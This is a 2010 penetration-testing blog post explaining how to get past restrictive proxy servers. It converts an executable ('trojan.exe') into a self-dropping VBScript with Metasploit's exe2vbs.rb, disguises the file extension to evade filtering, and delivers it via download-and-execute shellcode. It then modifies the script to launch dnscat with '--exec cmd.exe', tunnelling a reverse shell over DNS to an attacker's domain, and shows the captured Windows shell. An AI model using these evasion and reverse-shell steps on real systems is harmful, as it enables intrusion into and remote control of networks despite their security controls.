---
layout: post
title: Bypassing Restrictive Proxies Part 1, Encoded Executables and DNS Tunneling
date: '2010-06-19T00:43:00.001+10:00'
author: Stephen Bradshaw
tags:
- restrictive proxies
- pentesting
- shellcode
modified_time: '2010-06-29T20:32:46.772+10:00'
blogger_id: tag:blogger.com,1999:blog-2318886372568084567.post-6627344261938607650
blogger_orig_url: http://www.thegreycorner.com/2010/06/bypassing-restrictive-proxies-part-1.html
redirect_from: /2010/06/bypassing-restrictive-proxies-part-1.html
---

<span style="font-size: large;"><b>Uses for Download and Execute Script Shellcode</b></span> <br/><br/>A little while back I posted my <a href="http://grey-corner.blogspot.com/2010/05/download-and-execute-script-shellcode.html">Download and Execute Script shellcode</a> and mentioned that it could be used in bypassing restrictive proxy servers.  In this post I will give some quick examples of how you can actually do that.<br/><br/>The example scenarios I will describe are as follows, and involve having the script that is downloaded and executed:<br/><ul><li>write an arbitrary executable to disk and run it, or</li><li>open a reverse_http shell back through the restrictive proxy to the attackers system</li></ul><br/><b><span style="font-size: large;">Write an Executable to Disk and Run It</span></b><br/><br/>This scenario simply involves creating a vbscript file that contains an encoded copy of your chosen executable, that when run will decode the file, write it to disk, and then run it.  The end result of this is exactly the same as with regular download and execute shellcode, however unlike with regular download and execute shellcode this method will get past restrictive proxy servers that block files with executable content (you just need to make sure that the proxy server isn't also going to block pages with any of the script commands you have used, and if it does - obfuscate!).  <br/><br/>I was all set to write up a little program to automate this process of encoding an executable into a VBScript file, but then I stumbled onto the fact that a script to do this already exists - in Metasploit!<br/><br/>The script is called exe2vbs.rb and it sits inside the tools directory in the Metasploit 3 install directory.  Assuming your Metasploit3 install directory is /opt/metasploit3/ run it like so:<br/><br/><blockquote style='font-family: "Courier New",Courier,monospace;'><span style="color: black; font-size: small;">lupin@lion:~$ /opt/metasploit3/msf3/tools/exe2vbs.rb <br/>    Usage: /opt/metasploit3/msf3/tools/exe2vbs.rb [exe] [vbs]</span></blockquote><br/>So as an example, if you want to encode your executable trojan.exe into a vbscript trojan.vbs, use the following command line<br/><br/><blockquote><span style='font-family: "Courier New",Courier,monospace;'>lupin@lion:~$ /opt/metasploit3/msf3/tools/exe2vbs.rb trojan.exe trojan.vbs</span><br/><span style='font-family: "Courier New",Courier,monospace;'>[*] Converted 282624 bytes of EXE into a vbs script</span></blockquote><br/>You now have a VB Script file that you can host on a webserver, which when run will write your encoded executable to disk and execute it.  Just rename the extension of the file to something innocuous like .tmp to bypass proxy filename filtering, stick the script file on a webserver, and create an exploit using the Download and Execute Script shellcode as demonstrated in the Usage Examples section of <a href="http://grey-corner.blogspot.com/2010/05/download-and-execute-script-shellcode.html">this post</a>.<br/><span style="font-size: large;"><br/><b>DNS Tunneling</b></span><br/><br/>What type of executables should you download onto the target system, supposing you actually want to do something useful on the target system and given that the system exists within a restrictive environment?  Well, one potential tool is <a href="http://www.skullsecurity.org/wiki/index.php/Dnscat">Dnscat</a>, which can allow you to tunnel a shell out of the network via DNS, a protocol which is likely to be allowed to communicate externally even in some restrictive environments.  <br/><br/>Running Dnscat to tunnel a shell out of a system does require some command line options to be used with the executable, however this is not a problem because you can add any necessary command line options to the executable bound into your script file by modifying the "run" line in the script file.  Lets look at an example:<br/><br/>Download the Windows version of Dnscat and encode like so:<br/><br/><blockquote style='font-family: "Courier New",Courier,monospace;'>lupin@lion:~/Downloads/nbtool/nbtool-0.04$ /opt/metasploit3/msf3/tools/exe2vbs.rb dnscat.exe dnscat.vbs<br/>[*] Converted 121344 bytes of EXE into a vbs script</blockquote><br/>Then in the output vbs file look for a line similar to the following.  Your line will likely look a little different because the variable names are being randomised by the exe2vbs.rb script, but just keep your eye out for ".run" appearing at the end of the first word in a line near the end of the file.<br/><br/><blockquote><span style='font-family: "Courier New",Courier,monospace;'>cgbKynYWc.run CDWPYlgAnS, 0, true</span></blockquote><br/>Then modify this line to look like the following, replacing subdomain.example.com <tunnel.madeupdomain.org> with your own DNS domain <br/></tunnel.madeupdomain.org><br/><blockquote><span style='font-family: "Courier New",Courier,monospace;'>cgbKynYWc.run CDWPYlgAnS &amp; " --domain subdomain.example.com <tunnel.madeupdomain.org> --exec ""cmd.exe""", 0, true</tunnel.madeupdomain.org></span></blockquote><br/>Essentially I have just added the following text to the line just before the first comma, these are the command line parameters that will be fed to the dsncat executable when it is run by the script:<br/><br/><blockquote style='font-family: "Courier New",Courier,monospace;'>&amp; " --domain <span style='font-family: "Courier New",Courier,monospace;'>subdomain.example.com</span><tunnel.madeupdomain.org> --exec ""cmd.exe"""</tunnel.madeupdomain.org></blockquote><br/>Once that is done execute the script on your victim machine using an exploit, and if you are running a dnscat listener on your attacking machine ('dnscat --listen' as root) when the script runs you will receive a shell back via DNS:<br/><br/><blockquote><span style='font-family: "Courier New",Courier,monospace;'>lupin@lion:~$ sudo dnscat --listen</span><br/><span style='font-family: "Courier New",Courier,monospace;'>Waiting for DNS requests for domain '*' on 0.0.0.0:53...</span><br/><span style='font-family: "Courier New",Courier,monospace;'>Timeout has occurred, resetting state</span><br/><span style='font-family: "Courier New",Courier,monospace;'>Received SYN!</span><br/><span style='font-family: "Courier New",Courier,monospace;'>Sending 'ACK'</span><br/><span style='font-family: "Courier New",Courier,monospace;'>Microsoft Windows XP [Version 5.1.2600]</span><br/><span style='font-family: "Courier New",Courier,monospace;'>(C) Copyright 1985-2001 Microsoft Corp.</span><br/><br/><span style='font-family: "Courier New",Courier,monospace;'>C:\&gt;</span></blockquote><br/>Please note that this DNS shell tunneling method requires that your system be acting as the authorative name server for your chosen domain, AND it doesn't work in all environments (it certainly won't work when split DNS is implemented, but in some other cases it won't work either).  Read the <a href="http://www.skullsecurity.org/wiki/index.php/Dnscat">dnscat wiki entry</a> and <a href="http://www.dnstunnel.de/">this guide on DNS tunneling</a> to learn more.  If you want to test this locally without having a nameserver for your own domain, add the "--dns 192.168.56.1" switch to the modified run command in your script, where 192.168.56.1 should be replaced with the IP address (don't use a DNS name) of your attacking system.<br/><br/>Note that directly specifying the IP address of your attacking system like this won't work in (properly configured) restrictive environments - direct client connections to external DNS servers should not be permitted and all DNS queries should be sent through the environments configured DNS server, in which case they will only reach your attacking system if its acting as an authorative name server for the chosen domain.<br/><br/>The next entry in this series will cover how to tunnel out a shell via the restrictive proxy itself, using some slightly modified Metasploit reverse_http code.